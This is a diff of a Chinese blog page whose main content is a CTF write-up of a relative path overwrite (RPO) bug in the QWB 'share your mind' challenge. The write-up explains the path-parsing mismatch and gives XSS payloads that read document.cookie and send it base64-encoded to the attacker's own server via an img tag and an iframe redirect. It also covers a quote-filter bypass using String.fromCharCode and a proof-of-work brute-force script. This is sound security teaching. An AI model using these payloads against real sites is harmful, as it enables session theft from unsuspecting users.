@@ -119,7 +119,8 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-a7188a7d055115d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-34529ab862765418.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-e26f7d767e2e3dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-12-03T13:43:01.642Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-aa9eb95bfa2d4877.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-04T00:35:04.371Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RPO漏洞">
 <meta name="twitter:description" content="参考文献：http://120.77.209.122/index.php/archives/24/https://www.jianshu.com/p/340bd5353248 RPO漏洞就是服务端和客户端对这个URL的解析不一致导致的，当页面中调用的静态文件是以相对路径调用的时候，我们可以利用浏览器错误的解析页面的路径从而去错误的引导静态文件（CSS）文件加载 在apche上..%2f不能解析，只">
@@ -386,7 +387,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-03 21:43:01" itemprop="dateModified" datetime="2018-12-03T21:43:01+08:00">2018-12-03</time>
+                <time title="Modified: 2018-12-04 08:35:04" itemprop="dateModified" datetime="2018-12-04T08:35:04+08:00">2018-12-04</time>
               
             
           </span>
@@ -422,19 +423,20 @@
         <p>参考文献：<br><a href="http://120.77.209.122/index.php/archives/24/" target="_blank" rel="noopener">http://120.77.209.122/index.php/archives/24/</a><br><a href="https://www.jianshu.com/p/340bd5353248" target="_blank" rel="noopener">https://www.jianshu.com/p/340bd5353248</a></p>
 <p>RPO漏洞就是服务端和客户端对这个URL的解析不一致导致的，当页面中调用的静态文件是以相对路径调用的时候，我们可以利用浏览器错误的解析页面的路径从而去错误的引导静态文件（CSS）文件加载</p>
 <p>在apche上..%2f不能解析，只有在nginx上才能实现。条件这么苛刻，都不知道用处多大。。</p>
-<p><a href="http://www.cnblogs.com/p00mj/p/6755000.html：这个大佬的入门还是挺好的，可以看看这个，apache上也可以复现，代码就不贴了。有传参存在的时候，在这里浏览器误以为我们参数的键/country/是一个实际的路径，从而导致实际加载的css文件路径就成了" target="_blank" rel="noopener">http://www.cnblogs.com/p00mj/p/6755000.html：这个大佬的入门还是挺好的，可以看看这个，apache上也可以复现，代码就不贴了。有传参存在的时候，在这里浏览器误以为我们参数的键/country/是一个实际的路径，从而导致实际加载的css文件路径就成了</a><br><a href="http://localhost/hello/url.php/country/style.css，在这里服务端收到的请求会认为请求/country/style.css是一个键为country值为style.css的参数，从而返回页面。" target="_blank" rel="noopener">http://localhost/hello/url.php/country/style.css，在这里服务端收到的请求会认为请求/country/style.css是一个键为country值为style.css的参数，从而返回页面。</a></p>
+<p><a href="http://www.cnblogs.com/p00mj/p/6755000.html：这个大佬的入门还是挺好的，可以看看这个，apache上也可以复现，代码就不贴了。有传参存在的时候，在这里浏览器误以为我们参数的键/country/是一个实际的路径，从而导致实际加载的css文件路径就成了" target="_blank" rel="noopener">http://www.cnblogs.com/p00mj/p/6755000.html：这个大佬的入门还是挺好的，可以看看这个，apache上也可以复现，代码就不贴了。有传参存在的时候，在这里浏览器误以为我们参数的键/country/是一个实际的路径，从而导致实际加载的css文件路径就成了</a><br><code>http://localhost/hello/url.php/country/style.css</code>，在这里服务端收到的请求会认为请求/country/style.css是一个键为country值为style.css的参数，从而返回页面。</p>
 <p>发现RPO后利用修改了网页的路径，使页面css加载路径成为了可以加载任意的google域名下的任意样式表，然后在样式表中找到一个可以使用参数导入背景的网页，向里面插入攻击参数，传入了一个简单的css样式。使用被攻击页面url进行引用，页面的css样式改变攻击代码在能成功执行。</p>
 <p><strong>实在是不想搭个nginx的环境了，将强网杯 share your mind 复现下好了</strong></p>
 <p>在源码中，其中一个调用js的时候没有/，存在rpo漏洞。</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/5035860-a7188a7d055115d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 <p><img src="https://upload-images.jianshu.io/upload_images/5035860-34529ab862765418.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 <p><img src="https://upload-images.jianshu.io/upload_images/5035860-e26f7d767e2e3dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
-<p><em>payload：</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(%2f是/的url编码，服务器能解析，但是浏览器不能解析)</span><br><span class="line">其中，写文章的地方是我们可控的，写入我们想测试的xss语句，标题不要写，内容为alert(1),然后引用payload发现弹框了。</span><br><span class="line"></span><br><span class="line">查看当前js的引用路径```http://39.107.33.96:20000/index.php/view/article/2664/static/js/jquery.min.js</span><br></pre></td></tr></table></figure></p>
-<p>我们正常访问这个路径时发现内容和我们访问<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这就说明，网页按照这个路径把2664的内容当做了js文件进行了请求，并且还当做js代码执行了，而后面的js的路径被当做了参数忽略了。</span><br><span class="line"></span><br><span class="line">**构建攻击payload**</span><br></pre></td></tr></table></figure></p>
-<p>b=document.cookie;a=’&lt;img src=<a href="http://ip/&#39;+btoa(b)+&#39;&gt;&#39;" target="_blank" rel="noopener">http://ip/&#39;+btoa(b)+&#39;&gt;&#39;</a>;  document.write(a);<br>ip为自己的服务器ip,在服务器上查看日志文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为攻击代码的引用时会过滤了单引号和双引号，所以要对payload进行实体化编码，用String.fromCharCode()函数引用</span><br><span class="line">```print map(ord ,&quot;payload&quot;） //将payload放入进行实体化编码，python真的强</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><figcaption><span>//将实体化编码的payload放入```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后将```http://39.107.33.96:20000/index.php/view/article/2578/..%2f..%2f..%2f..%2findex.php```提交到Reports</span><br><span class="line">![1.png](https://upload-images.jianshu.io/upload_images/5035860-aa9eb95bfa2d4877.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">将GET后的内容base64解码，得到HINT=Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</span><br><span class="line">提交的时候还需爆破substr(\(md5($code),0,6) ，贴下代码</span><br></pre></td></tr></table></figure>
-<h1 id="usr-bin-env-python"><a href="#usr-bin-env-python" class="headerlink" title="!/usr/bin/env python"></a>!/usr/bin/env python</h1><p>import hashlib<br>def md5(s):<br>    return hashlib.md5(s).hexdigest()<br>for i in range(1, 99999999):<br>    if md5(str(i)).startswith(‘cd5664’):<br>        print i<br>        break<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将里面的内容写成题目上给的就行</span><br><span class="line"></span><br><span class="line">然后继续</span><br></pre></td></tr></table></figure></p>
-<p>var i = document.createElement(“iframe”);i.setAttribute(“src”, “/QWB_fl4g/QWB/“);<br>document.body.appendChild(i);i.addEventListener( “load”, function(){ var content = i.contentWindow.document.cookie; location=’//yourvps/‘+btoa(content);}, false);<br><code>`</code><br>跟上面一样，就不贴了。。</p>
+<p><em>payload：</em><br><code>http://39.107.33.96:20000/index.php/view/article/2664/..%2f..%2f..%2f..%2findex.php</code><br>(%2f是/的url编码，服务器能解析，但是浏览器不能解析)<br>其中，写文章的地方是我们可控的，写入我们想测试的xss语句，标题不要写，内容为alert(1),然后引用payload发现弹框了。</p>
+<p>查看当前js的引用路径<code>http://39.107.33.96:20000/index.php/view/article/2664/static/js/jquery.min.js</code><br>我们正常访问这个路径时发现内容和我们访问<code>http://39.107.33.96:20000/index.php/view/article/2664</code>的内容是一样的<br>这就说明，网页按照这个路径把2664的内容当做了js文件进行了请求，并且还当做js代码执行了，而后面的js的路径被当做了参数忽略了。</p>
+<p><strong>构建攻击payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b=document.cookie;a=&apos;&lt;img src=http://ip/&apos;+btoa(b)+&apos;&gt;&apos;;  document.write(a);</span><br><span class="line">ip为自己的服务器ip,在服务器上查看日志文件</span><br></pre></td></tr></table></figure></p>
+<p>因为攻击代码的引用时会过滤了单引号和双引号，所以要对payload进行实体化编码，用String.fromCharCode()函数引用<br><code>print map(ord ,&quot;payload&quot;） //将payload放入进行实体化编码，python真的强</code><br><code>eval(String.fromCharCode())  //将实体化编码的payload放入</code><br>然后将<code>http://39.107.33.96:20000/index.php/view/article/2578/..%2f..%2f..%2f..%2findex.php</code>提交到Reports<br><img src="https://upload-images.jianshu.io/upload_images/5035860-aa9eb95bfa2d4877.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>将GET后的内容base64解码，得到HINT=Try to get the cookie of path “/QWB_fl4g/QWB/“<br>提交的时候还需爆破substr((md5($code),0,6) ，贴下代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line">import hashlib</span><br><span class="line">def md5(s):</span><br><span class="line">    return hashlib.md5(s).hexdigest()</span><br><span class="line">for i in range(1, 99999999):</span><br><span class="line">    if md5(str(i)).startswith(&apos;cd5664&apos;):</span><br><span class="line">        print i</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
+<p>将里面的内容写成题目上给的就行</p>
+<p>然后继续<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var i = document.createElement(&quot;iframe&quot;);i.setAttribute(&quot;src&quot;, &quot;/QWB_fl4g/QWB/&quot;);</span><br><span class="line">document.body.appendChild(i);i.addEventListener( &quot;load&quot;, function()&#123; var content = i.contentWindow.document.cookie; location=&apos;//yourvps/&apos;+btoa(content);&#125;, false);</span><br></pre></td></tr></table></figure></p>
+<p>跟上面一样，就不贴了。。</p>
 
       
     </div>
@@ -537,17 +539,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -562,7 +555,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-count">61</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -616,22 +609,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#usr-bin-env-python"><span class="nav-number">1.</span> <span class="nav-text">!/usr/bin/env python</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
